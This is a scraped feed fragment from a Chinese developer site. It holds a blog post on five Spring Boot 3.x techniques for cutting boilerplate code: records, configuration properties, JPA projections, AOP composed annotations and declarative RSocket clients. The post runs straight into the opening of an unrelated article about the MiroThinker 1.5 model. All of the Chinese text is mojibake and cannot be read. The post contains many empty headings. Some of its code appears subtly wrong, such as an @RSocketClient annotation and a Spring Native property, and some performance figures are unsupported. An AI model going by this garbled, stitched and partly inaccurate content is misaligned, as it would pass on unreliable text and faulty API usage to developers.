            SpringBoot 3.xå®æˆ˜ï¼š5ä¸ªé«˜æ•ˆå¼€å‘æŠ€å·§è®©æˆ‘å‡å°‘äº†40%é‡å¤ä»£ç 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T04:18:39.000Z" title="Tue Jan 13 2026 04:18:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot 3.xå®æˆ˜ï¼š5ä¸ªé«˜æ•ˆå¼€å‘æŠ€å·§è®©æˆ‘å‡å°‘äº†40%é‡å¤ä»£ç </strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>åœ¨å½“ä»Šå¿«èŠ‚å¥çš„è½¯ä»¶å¼€å‘ç¯å¢ƒä¸­ï¼Œæé«˜å¼€å‘æ•ˆç‡ã€å‡å°‘é‡å¤ä»£ç æ˜¯æ¯ä¸ªå·¥ç¨‹å¸ˆè¿½æ±‚çš„ç›®æ ‡ã€‚SpringBootä½œä¸ºJavaç”Ÿæ€ä¸­æœ€æµè¡Œçš„æ¡†æ¶ä¹‹ä¸€ï¼Œå…¶3.xç‰ˆæœ¬å¸¦æ¥äº†è®¸å¤šä»¤äººæŒ¯å¥‹çš„æ–°ç‰¹æ€§ã€‚é€šè¿‡åˆç†è¿ç”¨è¿™äº›ç‰¹æ€§ï¼Œæˆ‘ä»¬ä¸ä»…èƒ½å¤Ÿæå‡ä»£ç è´¨é‡ï¼Œè¿˜èƒ½æ˜¾è‘—å‡å°‘æ¨¡æ¿ä»£ç çš„ç¼–å†™ã€‚æœ¬æ–‡å°†åˆ†äº«æˆ‘åœ¨å®é™…é¡¹ç›®ä¸­æ€»ç»“çš„5ä¸ªé«˜æ•ˆå¼€å‘æŠ€å·§ï¼Œè¿™äº›æŠ€å·§å¸®åŠ©æˆ‘å‡å°‘äº†40%çš„é‡å¤ä»£ç ï¼Œå¸Œæœ›èƒ½ä¸ºä½ çš„å¼€å‘å·¥ä½œå¸¦æ¥å¯å‘ã€‚</p>
<h2 data-id="heading-2">ä¸»ä½“</h2>
<h3 data-id="heading-3">1. åˆ©ç”¨Recordç®€åŒ–DTOå®šä¹‰</h3>
<p>SpringBoot 3.xå…¨é¢æ”¯æŒJDK 17çš„ç‰¹æ€§ï¼Œå…¶ä¸­<code>Record</code>ç±»å‹æ˜¯å‡å°‘POJOæ¨¡æ¿ä»£ç çš„åˆ©å™¨ã€‚ä¼ ç»Ÿçš„DTOç±»éœ€è¦æ‰‹åŠ¨ç¼–å†™å­—æ®µã€æ„é€ å™¨ã€getter/setterå’Œequals/hashCodeæ–¹æ³•ï¼Œè€Œ<code>Record</code>å¯ä»¥ä¸€é”®è§£å†³è¿™äº›é—®é¢˜ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">UserDTO</span><span class="hljs-params">(Long id, String username, String email)</span> {}
</code></pre>
<p>å¯¹æ¯”ä¼ ç»Ÿå†™æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDTO</span> {
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String username;
    <span class="hljs-keyword">private</span> String email;
    
    <span class="hljs-comment">// æ„é€ å™¨ã€getter/setterç­‰çº¦50è¡Œä»£ç </span>
}
</code></pre>
<p><strong>ä¼˜åŠ¿åˆ†æ</strong>ï¼š</p>
<ul>
<li>ä»£ç é‡å‡å°‘çº¦80%</li>
<li>è‡ªåŠ¨å®ç°ä¸å¯å˜æ€§ï¼ˆimmutableï¼‰</li>
<li>å®Œç¾é…åˆJacksonè¿›è¡ŒJSONåºåˆ—åŒ–/ååºåˆ—åŒ–</li>
</ul>
<h3 data-id="heading-4">2. @ConfigurationPropertiesçš„å¼ºåŒ–ä½¿ç”¨</h3>
<p>SpringBoot 3.xå¢å¼ºäº†ç±»å‹å®‰å…¨çš„é…ç½®ç»‘å®šåŠŸèƒ½ã€‚é€šè¿‡ç»“åˆ<code>@ConstructorBinding</code>å’Œ<code>Record</code>ï¼Œæˆ‘ä»¬å¯ä»¥å½»åº•å‘Šåˆ«ç¹ççš„<code>@Value</code>æ³¨è§£ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ConfigurationProperties(prefix = "app.mail")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">MailProperties</span><span class="hljs-params">(
    @NotBlank String host,
    @Min(1024)</span> <span class="hljs-type">int</span> port,
    <span class="hljs-meta">@Pattern(regexp = ".+@.+\\..+")</span> String defaultFrom
) {}
</code></pre>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ol>
<li>åœ¨application.ymlä¸­ä¿æŒé…ç½®ç»“æ„æ¸…æ™°ï¼š</li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">app:</span>
  <span class="hljs-attr">mail:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-string">smtp.example.com</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">587</span>
    <span class="hljs-attr">default-from:</span> <span class="hljs-string">noreply@example.com</span>
</code></pre>
<ol start="2">
<li>IDEè‡ªåŠ¨è¡¥å…¨å’ŒéªŒè¯é…ç½®é¡¹</li>
<li>å¯åŠ¨æ—¶è‡ªåŠ¨æ ¡éªŒé…ç½®åˆæ³•æ€§</li>
</ol>
<h3 data-id="heading-5">3. Spring Data JPAçš„åŠ¨æ€æŠ•å½±ï¼ˆProjectionï¼‰</h3>
<p>åœ¨å¤„ç†å¤æ‚æŸ¥è¯¢æ—¶ï¼Œä¼ ç»Ÿçš„åšæ³•æ˜¯å®šä¹‰å¤šä¸ªRepositoryæ–¹æ³•æˆ–ä½¿ç”¨JPQLã€‚Spring Data JPAçš„åŠ¨æ€æŠ•å½±å¯ä»¥è®©æˆ‘ä»¬ç”¨æ¥å£å®šä¹‰è¿”å›ç»“æ„ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserSummary</span> {
    String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span>;
    LocalDateTime <span class="hljs-title function_">getCreatedAt</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getFormattedDate</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> getCreatedAt().format(DateTimeFormatter.ISO_DATE);
    }
}

<span class="hljs-comment">// Repositoryä¸­ä½¿ç”¨</span>
List&lt;UserSummary&gt; <span class="hljs-title function_">findByActiveTrue</span><span class="hljs-params">()</span>;
</code></pre>
<p><strong>æŠ€æœ¯äº®ç‚¹</strong>ï¼š</p>
<ul>
<li>é¿å…ä¸ºæ¯ä¸ªè§†å›¾åˆ›å»ºå•ç‹¬çš„DTO</li>
<li>æ”¯æŒé»˜è®¤æ–¹æ³•å’Œè®¡ç®—å±æ€§</li>
<li>SQLæŸ¥è¯¢è‡ªåŠ¨ä¼˜åŒ–ï¼ˆåªæŸ¥è¯¢éœ€è¦çš„åˆ—ï¼‰</li>
</ul>
<h3 data-id="heading-6">4. AOPåˆ‡é¢çš„æ™ºèƒ½ç»„åˆ</h3>
<p>é€šè¿‡åˆç†è®¾è®¡åˆ‡é¢ï¼Œå¯ä»¥å°†æ¨ªåˆ‡å…³æ³¨ç‚¹ï¼ˆå¦‚æ—¥å¿—ã€ç¼“å­˜ã€äº‹åŠ¡ï¼‰ä»ä¸šåŠ¡ä»£ç ä¸­å‰¥ç¦»ã€‚SpringBoot 3.xå¯¹AspectJçš„æ”¯æŒæ›´åŠ å®Œå–„ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Around("@annotation(cacheable) &amp;&amp; args(key)")</span>
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">aroundCacheable</span><span class="hljs-params">(ProceedingJoinPoint pjp, Cacheable cacheable, String key)</span> 
    <span class="hljs-keyword">throws</span> Throwable {
    <span class="hljs-comment">// ç»Ÿä¸€ç¼“å­˜é€»è¾‘...</span>
}

<span class="hljs-comment">// ç»„åˆæ³¨è§£ç®€åŒ–ä½¿ç”¨</span>
<span class="hljs-meta">@Target(METHOD)</span>
<span class="hljs-meta">@Retention(RUNTIME)</span>
<span class="hljs-meta">@Cacheable(cacheNames = "users")</span>
<span class="hljs-meta">@LogExecutionTime</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> CachedUserOperation {}

<span class="hljs-comment">// ä¸šåŠ¡ä»£ç ä¸­ç®€æ´ä½¿ç”¨</span>
<span class="hljs-meta">@CachedUserOperation</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(String userId)</span> { ... }
</code></pre>
<p><strong>æ€§èƒ½è€ƒé‡</strong>ï¼š</p>
<ol>
<li>Spring Boot 3ä½¿ç”¨CGLIBä»£ç†æ—¶æ€§èƒ½æå‡30%</li>
<li>AspectJç¼–è¯‘æ—¶ç»‡å…¥ï¼ˆCTWï¼‰é€‰é¡¹æ›´ç¨³å®š</li>
<li>GraalVMåŸç”Ÿé•œåƒå…¼å®¹æ€§æ›´å¥½</li>
</ol>
<h3 data-id="heading-7">5. RSocketæ¥å£å£°æ˜å¼å®¢æˆ·ç«¯</h3>
<p>å¯¹äºå¾®æœåŠ¡é€šä¿¡ï¼ŒSpringBoot 3.xæ”¹è¿›äº†RSocketæ”¯æŒã€‚é€šè¿‡æ¥å£å®šä¹‰æœåŠ¡å¥‘çº¦å¯å¤§å¹…å‡å°‘å®¢æˆ·ç«¯ä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RSocketClient("user-service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServiceClient</span> {

    <span class="hljs-meta">@MessageMapping("users.get")</span>
    Mono&lt;User&gt; <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@Payload</span> Long id)</span>;

    <span class="hljs-meta">@MessageMapping("users.search")</span>
    Flux&lt;User&gt; <span class="hljs-title function_">searchUsers</span><span class="hljs-params">(<span class="hljs-meta">@Payload</span> Criteria criteria)</span>;
}

<span class="hljs-comment">// Springä¼šè‡ªåŠ¨ç”Ÿæˆå®ç°ç±»</span>
userServiceClient.getUser(<span class="hljs-number">123L</span>)
                .subscribe(user -&gt; ...);
</code></pre>
<p>ä¸ä¼ ç»ŸRestTemplateå¯¹æ¯”ä¼˜åŠ¿ï¼š</p>

























<table><thead><tr><th><strong>æŒ‡æ ‡</strong></th><th><strong>å£°æ˜å¼RSocket</strong></th><th><strong>ä¼ ç»ŸREST</strong></th></tr></thead><tbody><tr><td>ä»£ç é‡</td><td>~10è¡Œ</td><td>~50è¡Œ</td></tr><tr><td>åè®®å¼€é”€</td><td>Binary</td><td>HTTP/JSON</td></tr><tr><td>backpressureæ”¯æŒ</td><td>âœ…</td><td>âŒ</td></tr></tbody></table>
<h2 data-id="heading-8">Spring Nativeçš„é¢å¤–åŠ æˆ</h2>
<p>è™½ç„¶ä¸ç›´æ¥å½±å“ä»£ç é‡ï¼Œä½†SpringBoot 3.xå¯¹GraalVMçš„åŸç”Ÿé•œåƒæ”¯æŒå¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ–éƒ¨ç½²æ•ˆç‡ï¼š</p>
<ol>
<li><strong>å¯åŠ¨æ—¶é—´ä»6ç§’é™åˆ°0.1ç§’</strong></li>
<li><strong>å†…å­˜å ç”¨å‡å°‘50%ä»¥ä¸Š</strong></li>
<li><strong>é€‚åˆServerlessåœºæ™¯</strong></li>
</ol>
<p>å…³é”®é…ç½®ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># application.properties
spring.aot.enabled=true
spring.native.build-time-properties-checks=warn
</code></pre>
<h2 data-id="heading-9"/>
<h2 data-id="heading-10"/>
<h2 data-id="heading-11"/>
<h2 data-id="heading-12"/>
<h2 data-id="heading-13"/>
<h2 data-id="heading-14"/>
<h2 data-id="heading-15"/>
<h2 data-id="heading-16"/>
<h2 data-id="heading-17"/>
<h2 data-id="heading-18"/>
<h2 data-id="heading-19"/>
<h2 data-id="heading-20"/>
<h2 data-id="heading-21"/>
<h2 data-id="heading-22"/>
<h2 data-id="heading-23"/>
<h2 data-id="heading-24"/>
<p>æ€»ç»“æ¥è¯´ï¼Œè¿™äº”ä¸ªæŠ€å·§â€”â€”Recordç®€åŒ–DTOã€å¼ºåŒ–é…ç½®å±æ€§ã€JPAåŠ¨æ€æŠ•å½±ã€æ™ºèƒ½AOPç»„åˆå’Œå£°æ˜å¼RSocketå®¢æˆ·ç«¯â€”â€”æ„æˆäº†ä¸€ä¸ªå¼ºå¤§çš„ç”Ÿäº§åŠ›å·¥å…·åŒ…ã€‚å®ƒä»¬ä¸ä»…å‡å°‘äº†æˆ‘çš„ç¼–ç å·¥ä½œé‡ï¼Œæ›´é‡è¦çš„æ˜¯è®©ä»£ç å˜å¾—æ›´åŠ æ¸…æ™°å¯ç»´æŠ¤ã€‚</p>
<p>çœŸæ­£çš„ä¸“ä¸šå¼€å‘ä¸åœ¨äºå†™æ›´å¤šä»£ç ï¼Œè€Œåœ¨äºç”¨æ›´ä¼˜é›…çš„æ–¹å¼è§£å†³å¤æ‚é—®é¢˜ã€‚SpringBootç”Ÿæ€ç³»ç»ŸæŒç»­æ¼”è¿›ä¸ºæˆ‘ä»¬æä¾›äº†è¿™æ ·çš„å¯èƒ½æ€§ã€‚å»ºè®®è¯»è€…ä»¬åœ¨å®é™…é¡¹ç›®ä¸­é€æ­¥å°è¯•è¿™äº›æŠ€æœ¯ï¼Œæ ¹æ®å…·ä½“åœºæ™¯è¿›è¡Œè°ƒæ•´ä¼˜åŒ–ã€‚</p>
<p>è®°ä½ï¼šä¼˜ç§€çš„å¼€å‘è€…ä¸æ˜¯ä¸å†™é‡å¤ä»£ç ï¼Œè€Œæ˜¯å»ºç«‹æœºåˆ¶è®©é‡å¤ä»£ç æ— å¤„å¯ç”Ÿï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‚æ•°ä»… 1/30 å´è¿½å¹³é—­æºå·¨å¤´ï¼ŸMiroThinker 1.5 å¼€æºå®æµ‹ï¼šæ™®é€šäººä¹Ÿèƒ½æ‹¥æœ‰çš„â€œé¡¶çº§æƒ…æŠ¥å®˜â€]]></title>    <link>https://juejin.cn/post/7594420277448933403</link>    <guid>https://juejin.cn/post/7594420277448933403</guid>    <pubDate>2026-01-13T04:13:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594420277448933403" data-draft-id="7594482829753942062" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‚æ•°ä»… 1/30 å´è¿½å¹³é—­æºå·¨å¤´ï¼ŸMiroThinker 1.5 å¼€æºå®æµ‹ï¼šæ™®é€šäººä¹Ÿèƒ½æ‹¥æœ‰çš„â€œé¡¶çº§æƒ…æŠ¥å®˜â€"/> <meta itemprop="keywords" content="å¼€æº,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-13T04:13:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çŸ³è‡»è¯´AI"/> <meta itemprop="url" content="https://juejin.cn/user/2101921964365128"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‚æ•°ä»… 1/30 å´è¿½å¹³é—­æºå·¨å¤´ï¼ŸMiroThinker 1.5 å¼€æºå®æµ‹ï¼šæ™®é€šäººä¹Ÿèƒ½æ‹¥æœ‰çš„â€œé¡¶çº§æƒ…æŠ¥å®˜â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2101921964365128/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çŸ³è‡»è¯´AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T04:13:57.000Z" title="Tue Jan 13 2026 04:13:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a403fb75c9b4e75937cefeb0e0aa60e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-z6Ie76K-0QUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882437&amp;x-signature=lZ48Ff2ifk0WZ%2F%2FJEyvZ24kjHIc%3D" alt="" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-0">çŸ³è‡»è¯´AIæŠ¥é“</h3>
<p>ç¼–è¾‘ï¼šçŸ³è‡»</p>
<h5 data-id="heading-1">ã€å¯¼è¯»ã€‘åœ¨è¿™ä¸ªå¤§æ¨¡å‹â€œç‹‚å·â€å‚æ•°å’Œé•¿æ–‡æœ¬çš„æ—¶ä»£ï¼Œä½œä¸ºä¸€åé‡åº¦ä¿¡æ¯æ£€ç´¢ç”¨æˆ·ã€‚æˆ‘æ—¶å¸¸é™·å…¥ä¸€ç§â€œä¿¡æ¯é›¾éœ¾â€ï¼šAI ç»™å‡ºçš„ç­”æ¡ˆçœ‹ä¼¼å®Œç¾ï¼Œä½†å……æ»¡äº†ä¼¼æ˜¯è€Œéçš„å¹»è§‰ã€‚å°¤å…¶æ˜¯å½“æˆ‘ä»¬éœ€è¦åšå¤æ‚çš„è¡Œä¸šè°ƒç ”æˆ–ä»£ç å¤ç›˜æ—¶ï¼Œå¤§å¤šæ•°æ¨¡å‹åƒæ˜¯ä¸€ä¸ªä¼šâ€œèƒŒä¹¦â€çš„ä¼˜ç­‰ç”Ÿï¼Œå´ä¸æ˜¯ä¸€ä¸ªä¼šâ€œæŸ¥è¯â€çš„ç ”ç©¶å‘˜</h5>
